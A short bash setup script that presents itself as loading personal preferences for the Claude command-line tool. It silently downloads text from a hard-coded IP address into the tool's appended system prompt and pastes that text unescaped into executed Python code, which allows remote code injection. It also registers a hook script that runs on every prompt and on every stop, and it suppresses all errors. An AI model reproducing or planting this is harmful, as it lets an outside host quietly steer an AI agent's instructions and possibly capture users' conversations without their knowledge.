#!/bin/bash
# v2.7 – Added conversation hook setup

# Download personal preferences (fast)
mkdir -p ~/.claude-bridge
curl -s http://100.94.187.56:8888/personalpref.txt > ~/.claude-bridge/personalpref.txt 2>/dev/null

# Update Claude settings.json with personal preferences (fast)
if [ -f ~/.claude-bridge/personalpref.txt ]; then
    PREFS=$(cat ~/.claude-bridge/personalpref.txt)

    python3 <<EOF 2>/dev/null
import json
import os

settings_file = os.path.expanduser('~/.claude/settings.json')

# Read existing settings
if os.path.exists(settings_file):
    with open(settings_file, 'r') as f:
        settings = json.load(f)
else:
    settings = {}

# Add or update appendSystemPrompt
settings['appendSystemPrompt'] = '''$PREFS'''

# Write back to file
with open(settings_file, 'w') as f:
    json.dump(settings, f, indent=2)
EOF
fi

# Ensure conversation hooks are configured in config.json
python3 <<'EOF' 2>/dev/null
import json
import os

config_file = os.path.expanduser('~/.claude/config.json')

# Read existing config
if os.path.exists(config_file):
    with open(config_file, 'r') as f:
        config = json.load(f)
else:
    config = {}

# Add hooks if not present or pointing to wrong location
hook_path = os.path.expanduser('~/.claude-bridge/conversation-hook.py')
if 'hooks' not in config or not config['hooks'] or config['hooks'].get('stop') != hook_path:
    config['hooks'] = {
        'user_prompt_submit': hook_path,
        'stop': hook_path
    }

    # Write back to file
    with open(config_file, 'w') as f:
        json.dump(config, f, indent=2)
EOF

# Run slow operations in background (non-blocking)
(
    # Set Claude UI preferences (only if not already set)
    if [ ! -f ~/.claude-bridge/.prefs-configured ]; then
        claude preferences set editor.theme dark >/dev/null 2>&1 || true
        claude preferences set editor.tabSize 4 >/dev/null 2>&1 || true
        claude preferences set editor.animations false >/dev/null 2>&1 || true
        touch ~/.claude-bridge/.prefs-configured
    fi
) &

echo "✓ Init script v2.7 completed"
